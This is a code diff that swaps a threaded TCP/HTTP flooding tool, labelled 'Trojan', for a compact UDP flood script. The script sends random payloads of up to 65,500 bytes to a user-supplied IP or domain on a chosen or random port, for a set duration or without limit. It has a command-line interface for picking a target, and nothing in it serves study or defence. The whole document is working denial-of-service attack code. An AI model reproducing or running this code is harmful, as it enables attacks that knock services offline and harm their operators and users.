@@ -140,87 +140,48 @@ def usage():
     """""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""""
 
 
+def attack(ip, port, time, size):
 
-	usage : python3 Trojan.py [-s] [-p] [-t]
-	-h : help
-	-s : server ip
-	-p : port default 1122
-	-t : turbo default 100 \033[0m''')
-	sys.exit()
+    if time is None:
+        time = float('inf')
 
+    if port is not None:
+        port = max(1, min(65535, port))
 
-def get_parameters():
-	global host
-	global port
-	global thr
-	global item
-	optp = OptionParser(add_help_option=False,epilog="Trojan")
-	optp.add_option("-q","--quiet", help="set logging to ERROR",action="store_const", dest="loglevel",const=logging.ERROR, default=logging.INFO)
-	optp.add_option("-s","--server", dest="host",help="attack to server ip -s ip")
-	optp.add_option("-p","--port",type="int",dest="port",help="-p 80 default 80")
-	optp.add_option("-t","--turbo",type="int",dest="turbo",help="default 135 -t 135")
-	optp.add_option("-h","--help",dest="help",action='store_true',help="help you")
-	opts, args = optp.parse_args()
-	logging.basicConfig(level=opts.loglevel,format='%(levelname)-8s %(message)s')
-	if opts.help:
-		usage()
-	if opts.host is not None:
-		host = opts.host
-	else:
-		usage()
-	if opts.port is None:
-		port = 80
-	else:
-		port = opts.port
-	if opts.turbo is None:
-		thr = 135
-	else:
-		thr = opts.turbo
+    fmt = 'Attacking {ip} on {port} for {time} with a size of {size} bytes.'.format(
+        ip=ip,
+        port='port {port}'.format(port=port) if port else 'random ports',
+        time='{time} seconds'.format(time=time) if str(time).isdigit() else 'unlimited time',
+        size=size
+    )
+    print(fmt)
 
+    startup = tt()
+    size = os.urandom(min(65500, size))
+    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    
+    while True:
+        port = port or random.randint(1, 65535)
 
-# reading headers
-global data
-headers = open("headers.txt", "r")
-data = headers.read()
-headers.close()
-#task queue are q,w
-q = Queue()
-w = Queue()
+        endtime = tt()
+        if (startup + time) < endtime:
+            break
 
+        sock.sendto(size, (ip, port))
+
+    print('Attack finished.')
 
 if __name__ == '__main__':
-	if len(sys.argv) < 2:
-		usage()
-	get_parameters()
-	print("\033[92m",host," port: ",str(port)," turbo: ",str(thr),"\033[0m")
-	print("\033[94mPlease wait mengirim Trojan...\033[0m")
-	user_agent()
-	my_bots()
-	time.sleep(5)
-	try:
-		s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-		s.connect((host,int(port)))
-		s.settimeout(1)
-	except socket.error as e:
-		print("\033[91mcheck server ip and port\033[0m")
-		usage()
-	while True:
-		for i in range(int(thr)):
-			t = threading.Thread(target=dos)
-			t.daemon = True  # if thread is exist, it dies
-			t.start()
-			t2 = threading.Thread(target=dos2)
-			t2.daemon = True  # if thread is exist, it dies
-			t2.start()
-		start = time.time()
-		#tasking
-		item = 0
-		while True:
-			if (item>1800): # for no memory crash
-				item=0
-				time.sleep(.1)
-			item = item + 1
-			q.put(item)
-			w.put(item)
-		q.join()
-		w.join()
+    parser = argparse.ArgumentParser(description='Usage: python ud.py <ip> <port> <time> <size>')
+
+    parser.add_argument('ip', type=str, help='IP or domain to attack.')
+    parser.add_argument('-p', '--port', type=int, default=None, help='Port number.')
+    parser.add_argument('-t', '--time', type=int, default=None, help='Time in seconds.')
+    parser.add_argument('-s', '--size', type=int, default=1024, help='Size in bytes.')
+
+    args = parser.parse_args()
+
+    try:
+        attack(args.ip, args.port, args.time, args.size)
+    except KeyboardInterrupt:
+        print('Attack stopped.')
